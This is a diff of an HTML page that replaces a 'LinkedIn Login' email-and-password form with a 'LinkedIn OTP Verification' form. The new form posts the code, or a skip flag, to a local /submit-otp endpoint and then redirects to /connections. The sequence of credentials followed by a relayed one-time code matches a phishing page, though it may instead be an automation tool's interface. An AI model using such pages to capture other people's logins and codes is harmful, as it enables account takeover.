@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>LinkedIn Login</title>
+    <title>LinkedIn OTP Verification</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * {
@@ -39,17 +39,26 @@
             border-radius: 8px;
         }
 
-        .login-button {
+        .button {
             width: 100%;
             padding: 15px;
-            margin-top: 20px;
-            background: linear-gradient(45deg, #ff0000, #8B0000);
-            color: white;
-            border: none;
+            margin-top: 10px;
             border-radius: 8px;
             cursor: pointer;
             text-transform: uppercase;
             letter-spacing: 1px;
+        }
+
+        .verify-button {
+            background: linear-gradient(45deg, #ff0000, #8B0000);
+            color: white;
+            border: none;
+        }
+
+        .skip-button {
+            background: transparent;
+            color: #ff0000;
+            border: 2px solid #ff0000;
         }
 
         #result {
@@ -70,42 +79,51 @@
 </head>
 <body>
     <div class="login-container">
-        <h2 class="title">LinkedIn Login</h2>
-        <form id="loginForm">
-            <input type="email" name="username" class="login-input" placeholder="LinkedIn Email" required>
-            <input type="password" name="password" class="login-input" placeholder="Password" required>
-            <button type="submit" class="login-button">Login</button>
+        <h2 class="title">OTP Verification</h2>
+        <form id="otpForm">
+            <input type="text" name="otp" class="login-input" placeholder="Enter OTP Code" required>
+            <button type="submit" class="button verify-button">Verify OTP</button>
         </form>
+        <button id="skipOTP" class="button skip-button">Skip OTP</button>
         <div id="result"></div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const formData = new FormData(this);
+            handleSubmission(new FormData(this));
+        });
+
+        document.getElementById('skipOTP').addEventListener('click', function() {
+            const formData = new FormData();
+            formData.append('skip_otp', 'true');
+            handleSubmission(formData);
+        });
+
+        function handleSubmission(formData) {
             const resultDiv = document.getElementById('result');
-            resultDiv.textContent = 'Logging in...';
-            
-            fetch('/submit-password', {  // Changed from /login to /submit-password
+            resultDiv.textContent = 'Processing...';
+
+            fetch('/submit-otp', {
                 method: 'POST',
                 body: formData
             })
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
-                    resultDiv.textContent = 'Login successful! Redirecting to OTP verification...';
+                    resultDiv.textContent = 'Verification successful! Redirecting...';
                     setTimeout(() => {
-                        window.location.href = '/otp';
-                    }, 1500);
+                        window.location.href = '/connections';
+                    }, 1000);
                 } else {
-                    resultDiv.textContent = data.message || 'Login failed. Please check your credentials.';
+                    resultDiv.textContent = data.message || 'Verification failed. Please try again.';
                 }
             })
             .catch(error => {
-                resultDiv.textContent = 'An error occurred. Please try again.';
+                resultDiv.textContent = 'Error occurred. Please try again.';
                 console.error('Error:', error);
             });
-        });
+        }
     </script>
 </body>
 </html>
